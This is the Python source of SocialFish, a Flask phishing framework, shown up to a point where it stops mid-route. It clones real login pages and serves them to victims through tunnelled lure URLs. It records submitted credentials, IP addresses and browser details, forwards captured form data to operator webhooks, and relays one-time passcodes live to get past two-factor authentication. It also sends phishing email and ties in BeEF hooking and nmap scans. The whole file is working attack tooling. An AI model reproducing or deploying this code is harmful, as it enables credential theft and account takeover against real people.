#!/usr/bin/env python3
#
from flask import Flask, request, render_template, render_template_string, jsonify, redirect, g, flash
from flask_socketio import SocketIO, emit, join_room, leave_room
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken, genQRCode
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique
from core.db_migration import migrate_db
from core.tunnel_manager import TunnelManager
from core.recorder_playwright import PlaywrightRecorder
from core.cookie_inspector import CookieInspector
from core.recorder_selenium import SeleniumRecorder
from core.mock_server import MockLoginServer
from core.advanced_attacks import TabJacking, FileUploadInjection, AdvancedStealth, CAPTCHASolver
from datetime import date, datetime
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os
import json
import hashlib
import asyncio
import logging
from pathlib import Path

# Configure logging
logger = logging.getLogger("SocialFish")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")

# Verificar argumentos
if len(argv) < 2:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Temporario
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)
# Definicoes do flask
app = Flask(__name__, static_url_path='',
            static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Initialize SocketIO for live panel
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Initialize managers
tunnel_manager = TunnelManager()
cookie_inspector = CookieInspector(DATABASE)

# Inicia uma conexao com o banco antes de cada requisicao
@app.before_request
def before_request():
    g.db = sqlite3.connect(DATABASE)

# Finaliza a conexao com o banco apos cada conexao
@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

# Ensure `socialfish` table has a default row and provide safe getters
def ensure_socialfish_row(conn):
    try:
        # `conn` may be a sqlite3.Connection; use its execute which returns a cursor
        conn.execute("""CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """)
        cur = conn.execute("SELECT id FROM socialfish WHERE id = 1")
        if cur.fetchone() is None:
            t = genToken()
            conn.execute('INSERT INTO socialfish(id,clicks,attacks,token) VALUES(?,?,?,?)', (1, 0, 0, t))
            conn.commit()
    except Exception as e:
        print(f'[-] ensure_socialfish_row error: {e}')


def sf_get(cur, column, default=None):
    try:
        row = cur.execute(f"SELECT {column} FROM socialfish where id = 1").fetchone()
        return row[0] if row and row[0] is not None else default
    except Exception:
        return default

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0

    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")

    for i in select_clicks:
        count = i[0]

    count = count - countCreds()
    return count

#----------------------------------------

# definicoes do flask e de login
app.secret_key = APP_SECRET_KEY
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(email):
    if email not in users:
        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in users:
        return

    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']

    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@app.route('/neptune', methods=['GET', 'POST'])
def admin():
    # se a requisicao for get
    if request.method == 'GET':
        # se o usuario estiver logado retorna para a pagina de credenciais
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        # caso contrario retorna para a pagina de login
        else:
            return render_template('signin.html')

    # se a requisicao for post, verifica-se as credencias
    if request.method == 'POST':
        email = request.form['email']
        try:
            # caso sejam corretas
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                # torna autentico
                flask_login.login_user(user)
                # retorna acesso a pagina restrita
                return redirect('/creds')
            # contrario retorna erro
            else:
                # temporario
                return "bad"
        except:
            return "bad"

# funcao onde e realizada a renderizacao da pagina para a vitima
@app.route("/")
def getLogin():
    # Get config from database instead of global variables
    conn = g.db
    config = conn.execute("SELECT * FROM socialfish WHERE id = 1").fetchone()
    # Retrieve status and URL from config or use defaults
    cur = conn.execute("SELECT status, url, beef FROM config LIMIT 1")
    conf_row = cur.fetchone()

    if conf_row:
        sta, url, beef = conf_row[0], conf_row[1], conf_row[2]
    else:
        sta = 'custom'
        url = 'https://github.com/UndeadSec/SocialFish'
        beef = 'no'
    
    # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
    if sta == 'clone':
        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
        # Sanitize agent to prevent path traversal
        agent = agent.replace('..', '').replace('/', '_')
        clone(url, agent, beef)
        o = url.replace('://', '-')
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
        g.db.commit()
        template_path = 'fake/{}/{}/index.html'.format(agent, o)
        return render_template(template_path)
    # caso seja a url padrao
    elif url == 'https://github.com/UndeadSec/SocialFish':
        return render_template('default.html')
    # caso seja configurada para custom
    else:
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 WHERE id = 1")
        g.db.commit()
        return render_template('custom.html')

# funcao onde e realizado o login por cada pagina falsa
@app.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser) if request.user_agent else 'Unknown'
        bversion = str(request.user_agent.version) if request.user_agent else 'Unknown'
        platform = str(request.user_agent.platform) if request.user_agent else 'Unknown'
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        
        # Get redirect URL from config table
        cur = g.db
        conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
        
        # Get the target URL from config
        url_row = cur.execute("SELECT url FROM config LIMIT 1").fetchone()
        url = url_row[0] if url_row else 'https://github.com/UndeadSec/SocialFish'
        
        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
    
    # Get redirect URL from config
    cur = g.db
    conf_row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
    red = conf_row[0] if conf_row else 'https://github.com/UndeadSec/SocialFish'
    
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@app.route('/configure', methods=['POST'])
def echo():
    red = request.form.get('red', 'https://github.com/UndeadSec/SocialFish')
    sta = request.form.get('status', 'custom')
    beef = request.form.get('beef', 'no')

    if sta == 'clone':
        url = request.form.get('url', 'https://github.com/UndeadSec/SocialFish')
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    
    # Store configuration in database instead of global variables
    cur = g.db
    # Create config table if it doesn't exist
    cur.execute("""CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY,
        url TEXT,
        red TEXT,
        status TEXT,
        beef TEXT
    )""")
    
    cur.execute("DELETE FROM config")
    cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
                (url, red, sta, beef))
    cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
    g.db.commit()
    return redirect('/creds')

# pagina principal do dashboard
@app.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    # Ensure the socialfish row exists and get values safely
    ensure_socialfish_row(cur)
    attacks = sf_get(cur, 'attacks', 0)
    clicks = sf_get(cur, 'clicks', 0)
    tokenapi = sf_get(cur, 'token', '')
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)

# pagina para envio de emails
@app.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        row = cur.execute("SELECT email, smtp, port FROM sfmail where id = 1").fetchone()
        if row:
            email, smtp, port = row[0], row[1], row[2]
        else:
            email, smtp, port = '', '', ''
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
        cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
        cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log
@app.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        if not id.isdigit():
            return "Invalid ID"
        sql = "SELECT jdoc FROM creds WHERE id = ?"
        cur = g.db
        credInfo = cur.execute(sql, (id,)).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@app.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except Exception as e:
        print(f'[-] Trace error: {str(e)}')
        return "Network Error", 500

# rota para scan do nmap
@app.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    import re
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return "Invalid IP format", 400
    
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@app.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        new_token = genToken()
        cur.execute("UPDATE socialfish SET token = ? WHERE id = 1", (new_token,))
        g.db.commit()
        ensure_socialfish_row(cur)
        token = sf_get(cur, 'token', '')
        genQRCode(token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@app.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@app.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@app.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@app.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#================================================================================================================================
# RECORDER & TEMPLATES ROUTES (v3.0+)

# Recorder - Start/Stop recording session
@app.route("/recorder/start", methods=['POST'])
@flask_login.login_required
def recorder_start():
    """Start a new recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    headless = data.get('headless', 'true').lower() == 'true'
    stealth = data.get('stealth', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
        recorder = PlaywrightRecorder(DATABASE, headless=headless, stealth=stealth)
        # Store recorder session in g for tracking
        g.recorder = recorder
        
        return jsonify({
            'status': 'ok',
            'message': 'Recording started',
            'recorder_id': id(recorder)
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recorder - Save template
@app.route("/recorder/save-template", methods=['POST'])
@flask_login.login_required
def save_template():
    """Save recording as a reusable template"""
    data = request.json or request.form
    template_name = data.get('name')
    description = data.get('description', '')
    tags = data.get('tags', '')
    clone_mode = data.get('clone_mode', 'both')
    
    if not template_name:
        return jsonify({'status': 'error', 'message': 'Template name required'}), 400
    
    try:
        cur = g.db
        cur.execute("""
            INSERT INTO templates(name, base_url, description, tags, clone_mode, created_by)
            VALUES(?, ?, ?, ?, ?, ?)
        """, (
            template_name,
            data.get('base_url', 'https://example.com'),
            description,
            tags,
            clone_mode,
            flask_login.current_user.id
        ))
        g.db.commit()
        template_id = cur.lastrowid
        
        return jsonify({
            'status': 'ok',
            'template_id': template_id,
            'message': f'Template saved: {template_name}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Templates - List all templates
@app.route("/templates", methods=['GET'])
@flask_login.login_required
def list_templates():
    """List all saved templates"""
    cur = g.db
    templates = cur.execute("SELECT id, name, base_url, description, tags, clone_mode, created_at FROM templates ORDER BY created_at DESC").fetchall()
    
    template_list = []
    for t in templates:
        template_list.append({
            'id': t[0],
            'name': t[1],
            'base_url': t[2],
            'description': t[3],
            'tags': t[4],
            'clone_mode': t[5],
            'created_at': t[6]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(template_list)
    
    return render_template('admin/templates.html', templates=template_list)

# Templates - Load template details
@app.route("/templates/<int:template_id>", methods=['GET'])
@flask_login.login_required
def get_template(template_id):
    """Get template details"""
    cur = g.db
    template = cur.execute("SELECT * FROM templates WHERE id = ?", (template_id,)).fetchone()
    
    if not template:
        return jsonify({'status': 'error', 'message': 'Template not found'}), 404
    
    return jsonify({
        'id': template[0],
        'name': template[1],
        'base_url': template[2],
        'description': template[3]
    })

# MITM & Tunneling - Configure tunnel for template
@app.route("/tunnel/setup", methods=['POST'])
@flask_login.login_required
def tunnel_setup():
    """Setup tunnel (ngrok/cloudflared) for a template"""
    data = request.json or request.form
    template_id = data.get('template_id')
    tunnel_type = data.get('tunnel_type', 'ngrok')  # ngrok or cloudflared
    tunnel_token = data.get('tunnel_token')
    
    if tunnel_type == 'ngrok' and tunnel_token:
        tunnel_url = tunnel_manager.start_ngrok_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    elif tunnel_type == 'cloudflared':
        tunnel_url = tunnel_manager.start_cloudflared_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    else:
        return jsonify({'status': 'error', 'message': 'Invalid tunnel type'}), 400
    
    if tunnel_url:
        # Store tunnel config in DB
        cur = g.db
        cur.execute("""
            INSERT OR REPLACE INTO mitm_config(template_id, tunnel_type, tunnel_token, tunnel_domain)
            VALUES(?, ?, ?, ?)
        """, (template_id, tunnel_type, tunnel_token, tunnel_url))
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'tunnel_url': tunnel_url,
            'message': f'{tunnel_type} tunnel started'
        })
    
    return jsonify({'status': 'error', 'message': 'Failed to start tunnel'}), 500

# Lure URL - Generate phishing link
@app.route("/lure/generate", methods=['POST'])
@flask_login.login_required
def generate_lure():
    """Generate a lure URL for phishing campaign"""
    data = request.json or request.form
    template_id = data.get('template_id')
    
    if not template_id:
        return jsonify({'status': 'error', 'message': 'Template ID required'}), 400
    
    # Generate lure hash
    lure_hash = hashlib.sha256(f"{template_id}{date.today()}".encode()).hexdigest()[:16]
    
    # Get tunnel URL for this template
    cur = g.db
    tunnel_config = cur.execute("SELECT tunnel_domain FROM mitm_config WHERE template_id = ?", (template_id,)).fetchone()
    
    if tunnel_config and tunnel_config[0]:
        lure_url = f"{tunnel_config[0]}/capture/{lure_hash}"
    else:
        # Fallback to localhost if no tunnel configured
        lure_url = f"http://localhost:5000/capture/{lure_hash}"
    
    # Store lure URL in DB
    cur.execute("""
        INSERT INTO lure_urls(template_id, lure_hash, full_url)
        VALUES(?, ?, ?)
    """, (template_id, lure_hash, lure_url))
    g.db.commit()
    
    return jsonify({
        'status': 'ok',
        'lure_url': lure_url,
        'lure_hash': lure_hash
    })

# Victim Capture Page - Generic phishing form
@app.route("/capture/<lure_hash>", methods=['GET', 'POST'])
def victim_capture(lure_hash):
    """Generic victim capture page - responds with cloned page or form"""
    cur = g.db
    
    # Find template by lure hash
    lure_record = cur.execute("SELECT template_id FROM lure_urls WHERE lure_hash = ?", (lure_hash,)).fetchone()
    
    if not lure_record:
        return "Not found", 404
    
    template_id = lure_record[0]
    template = cur.execute("SELECT base_url, clone_mode FROM templates WHERE id = ?", (template_id,)).fetchone()
    
    if not template:
        return "Template not found", 404
    
    if request.method == 'POST':
        # Capture victim data
        form_data = request.form.to_dict()
        victim_ip = request.remote_addr
        victim_ua = request.headers.get('User-Agent', 'Unknown')
        
        # Create session record
        session_hash = hashlib.sha256(f"{lure_hash}{victim_ip}{date.today()}".encode()).hexdigest()[:16]
        
        cur.execute("""
            INSERT INTO sessions(template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials)
            VALUES(?, ?, ?, ?, ?, ?)
        """, (
            template_id,
            session_hash,
            victim_ip,
            victim_ua,
            json.dumps(request.user_agent.__dict__ if hasattr(request, 'user_agent') else {}),
            json.dumps(form_data)
        ))
        g.db.commit()
        session_id = cur.lastrowid
        
        # Update lure click count
        cur.execute("UPDATE lure_urls SET click_count = click_count + 1 WHERE lure_hash = ?", (lure_hash,))
        g.db.commit()
        
        # Trigger webhooks for this template
        webhooks = cur.execute("SELECT webhook_url, webhook_type FROM webhooks WHERE template_id = ? AND enabled = 1", (template_id,)).fetchall()
        
        for webhook_url, webhook_type in webhooks:
            try:
                import requests
                payload = {
                    'session_id': session_id,
                    'victim_ip': victim_ip,
                    'form_data': form_data,
                    'timestamp': date.today().isoformat()
                }
                requests.post(webhook_url, json=payload, timeout=5)
            except (requests.RequestException, Exception) as e:
                print(f'[-] Webhook failed: {str(e)}')
        
        # Emit live notification via WebSocket
        socketio.emit('victim_submission', {
            'template_id': template_id,
            'session_id': session_id,
            'victim_ip': victim_ip,
            'timestamp': date.today().isoformat()
        }, broadcast=True)
        
        # Redirect to real site or OTP panel
        if template[1] == 'cookies':
            return redirect(template[0])  # Send to real site
        else:
            # Stay for OTP interception
            return render_template('admin/otp_panel.html', session_id=session_id, template_id=template_id)
    
    # GET - return cloned page
    if template[1] == 'clone':
        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
        # Sanitize agent to prevent path traversal
        agent = agent.replace('..', '').replace('/', '_').replace('\\', '_')
        clone(template[0], agent, 'no')  # Clone without BEEF
        o = template[0].replace('://', '-')
        template_path = f'fake/{agent}/{o}/index.html'
        try:
            return render_template(template_path)
        except Exception:
            return "Template not found", 404
    else:
        # Return custom template or generic form
        return render_template('custom.html')

# Live OTP Panel - WebSocket endpoint
@socketio.on('otp_listen')
def otp_listen(data):
    """Listen for OTP codes on victim's browser"""
    session_id = data.get('session_id')
    join_room(f"otp_{session_id}")
    emit('status', {'message': 'Listening for OTP'})

@socketio.on('otp_received')
def otp_received(data):
    """Operator received/received OTP code"""
    session_id = data.get('session_id')
    otp_code = data.get('otp_code')
    
    # Emit to victim's browser to inject OTP
    emit('inject_otp', {'otp_code': otp_code}, room=f"otp_{session_id}")
    
    # Log OTP event
    cur = g.db
    cur.execute("""
        INSERT INTO analyzer_logs(session_id, detection_type, detection_value)
        VALUES(?, ?, ?)
    """, (session_id, 'otp_injected', otp_code))
    g.db.commit()

# Webhook Management - Add/delete webhooks
@app.route("/webhooks", methods=['GET', 'POST'])
@flask_login.login_required
def manage_webhooks():
    """Add webhook notification for template"""
    if request.method == 'POST':
        data = request.json or request.form
        template_id = data.get('template_id')
        webhook_url = data.get('webhook_url')
        webhook_type = data.get('webhook_type', 'json')
        trigger_on = data.get('trigger_on', 'credential_submit')
        
        cur = g.db
        cur.execute("""
            INSERT INTO webhooks(template_id, webhook_url, webhook_type, trigger_on)
            VALUES(?, ?, ?, ?)
        """, (template_id, webhook_url, webhook_type, trigger_on))
        g.db.commit()
        
        return jsonify({'status': 'ok', 'message': 'Webhook added'})
    
    # GET - list webhooks
    cur = g.db
    webhooks = cur.execute("SELECT id, template_id, webhook_url, webhook_type, trigger_on FROM webhooks").fetchall()
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify([{
            'id': w[0],
            'template_id': w[1],
            'webhook_url': w[2],
            'webhook_type': w[3],
            'trigger_on': w[4]
        } for w in webhooks])
    
    return render_template('admin/webhooks.html', webhooks=webhooks)

# Sessions - View captured sessions
@app.route("/sessions", methods=['GET'])
@flask_login.login_required
def list_sessions():
    """List all captured victim sessions"""
    cur = g.db
    sessions = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, submission_timestamp
        FROM sessions ORDER BY submission_timestamp DESC LIMIT 100
    """).fetchall()
    
    session_list = []
    for s in sessions:
        session_list.append({
            'id': s[0],
            'template_id': s[1],
            'session_hash': s[2],
            'victim_ip': s[3],
            'victim_ua': s[4],
            'timestamp': s[5]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(session_list)
    
    return render_template('admin/sessions.html', sessions=session_list)

# Session Details
@app.route("/session/<int:session_id>", methods=['GET'])
@flask_login.login_required
def get_session(session_id):
    """Get detailed session data"""
    cur = g.db
    session = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials, submission_timestamp
        FROM sessions WHERE id = ?
    """, (session_id,)).fetchone()
    
    if not session:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    # Get cookies
    cookies = cur.execute("SELECT name, value, domain, path FROM cookies WHERE session_id = ?", (session_id,)).fetchall()
    
    return jsonify({
        'id': session[0],
        'template_id': session[1],
        'session_hash': session[2],
        'victim_ip': session[3],
        'victim_ua': session[4],
        'form_data': json.loads(session[5] if session[5] else '{}'),
        'credentials': json.loads(session[6] if session[6] else '{}'),
        'timestamp': session[7],
        'cookies': [{
            'name': c[0],
            'value': c[1],
            'domain': c[2],
            'path': c[3]
        } for c in cookies]
    })

#================================================================================================================================

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    return 'Unauthorized'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE
@app.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        cur = g.db
        attacks = sf_get(cur, 'attacks', 0)
        clicks = sf_get(cur, 'clicks', 0)
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@app.route("/api/getJson/<key>", methods=['GET'])
def getJson(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content.get('key') == tokenapi:
            red = content.get('red', 'https://github.com/UndeadSec/SocialFish')
            beef = content.get('beef', 'no')
            sta = content.get('sta', 'custom')
            
            if sta == 'clone':
                url = content.get('url', 'https://github.com/UndeadSec/SocialFish')
            else:
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            
            # Store in database instead of global variables
            cur.execute("DELETE FROM config")
            cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
                        (url, red, sta, beef))
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
                cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
                cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except Exception as e:
            print(f'[-] API trace error: {str(e)}')
            content = {'status':'bad', 'error': 'Trace failed'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            return jsonify(nScan(ip))
        except Exception as e:
            print(f'[-] API scan error: {str(e)}')
            return jsonify({'status':'bad', 'error': 'Scan failed'})
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        urls = cur.execute("SELECT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        comp = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})

#================================================================================================================================
# ADVANCED ATTACK TECHNIQUES (v3.0+)

# Selenium Browser Control
@app.route("/selenium/record", methods=['POST'])
